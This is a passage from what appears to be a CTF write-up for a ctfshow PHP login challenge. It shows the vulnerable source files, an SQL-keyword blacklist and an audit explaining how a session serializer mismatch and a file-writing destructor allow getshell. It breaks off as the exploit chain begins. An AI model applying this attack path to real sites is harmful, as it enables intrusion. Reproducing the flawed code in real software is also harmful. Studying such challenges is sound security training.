class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="language-php"># -*- coding: utf-8 -*-</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Author</span>: h1xa</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Date</span>:   2020-09-03 16:28:37</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-06 19:21:45</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span></span><br><span class="hljs-comment"><span class="language-php">*/</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">session_start</span>();</span><br><span class="language-php"><span class="hljs-comment">//超过5次禁止登陆</span></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="language-php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;登陆失败次数超过限制&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);</span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php"> <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;limit&quot;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;1&#x27;</span>));</span><br><span class="language-php"> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"> </span><br><span class="language-xml"> </span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ctfshow登陆<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pc-kk-form&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CTFshow 登陆<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return false;&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pc-kk-form-list&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;用户名&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pc-kk-form-list&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;密码&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pc-kk-form-btn&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;check();&quot;</span>&gt;</span>登陆<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">$.<span class="hljs-title function_">ajax</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;check.php&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-string">&#x27;u&#x27;</span>:$(<span class="hljs-string">&#x27;#u&#x27;</span>).<span class="hljs-title function_">val</span>(),</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-string">&#x27;pass&#x27;</span>:$(<span class="hljs-string">&#x27;#pass&#x27;</span>).<span class="hljs-title function_">val</span>()</span></span><br><span class="language-javascript"><span class="language-xml">&#125;,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data).<span class="hljs-property">msg</span>);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data).<span class="hljs-property">msg</span>);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"> </span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"> </span></span><br><span class="language-javascript"><span class="language-xml"> </span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-03 16:59:10</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-06 19:15:38</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET</span>)&#123;<br> <br><span class="hljs-variable">$data</span>= <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<br>[<span class="hljs-string">&#x27;id&#x27;</span>,<br><span class="hljs-string">&#x27;UserName0&#x27;</span><br>],[<br><span class="hljs-string">&quot;AND&quot;</span>=&gt;[<br><span class="hljs-string">&quot;UserName0[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<br><span class="hljs-string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] //密码必须为<span class="hljs-number">128</span>位大小写字母+数字+特殊符号，防止爆破<br>]<br>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br><span class="hljs-comment">//登陆成功取消次数累计</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;欢迎您&quot;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;UserName0&#x27;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//登陆失败累计次数加1</span><br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;登陆失败&quot;</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>inc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">use</span> \<span class="hljs-title">CTFSHOW</span>\<span class="hljs-title">CTFSHOW</span>; <br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;CTFSHOW.php&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTFSHOW</span>([<br>    <span class="hljs-string">&#x27;database_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-string">&#x27;database_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;web&#x27;</span>,<br>    <span class="hljs-string">&#x27;server&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-number">3306</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;option&#x27;</span> =&gt; [<br>        PDO::<span class="hljs-variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="hljs-variable constant_">CASE_NATURAL</span><br>    ]<br>]);<br> <br><span class="hljs-comment">// sql注入检查</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkForm</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;使用&quot;</span>.<span class="hljs-variable">$this</span>-&gt;password.<span class="hljs-string">&quot;登陆&quot;</span>.(<span class="hljs-variable">$this</span>-&gt;status?<span class="hljs-string">&quot;成功&quot;</span>:<span class="hljs-string">&quot;失败&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.<span class="hljs-title function_ invoke__">date_create</span>()-&gt;<span class="hljs-title function_ invoke__">format</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br> <br><span class="hljs-comment">/*生成唯一标志</span><br><span class="hljs-comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span><br><span class="hljs-comment">*/</span><br> <br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-variable">$chars</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">mt_rand</span>(), <span class="hljs-literal">true</span>));  <br>    <span class="hljs-variable">$uuid</span> = <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span> <br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;  <br>&#125;  <br></code></pre></td></tr></table></figure><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">代码审计后主要有几个关键区域。<br><br>在index.php 我们发现<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]我们可以进行控制<br><br><span class="hljs-comment">//超过5次禁止登陆</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;登陆失败次数超过限制&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br>  <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;limit&quot;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;1&#x27;</span>));<br>   <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>&#125;<br>flag在flag.php处，目测需要rce<br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;使用&quot;</span>.<span class="hljs-variable">$this</span>-&gt;password.<span class="hljs-string">&quot;登陆&quot;</span>.(<span class="hljs-variable">$this</span>-&gt;status?<span class="hljs-string">&quot;成功&quot;</span>:<span class="hljs-string">&quot;失败&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.<span class="hljs-title function_ invoke__">date_create</span>()-&gt;<span class="hljs-title function_ invoke__">format</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br></code></pre></td></tr></table></figure><p>构造链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span 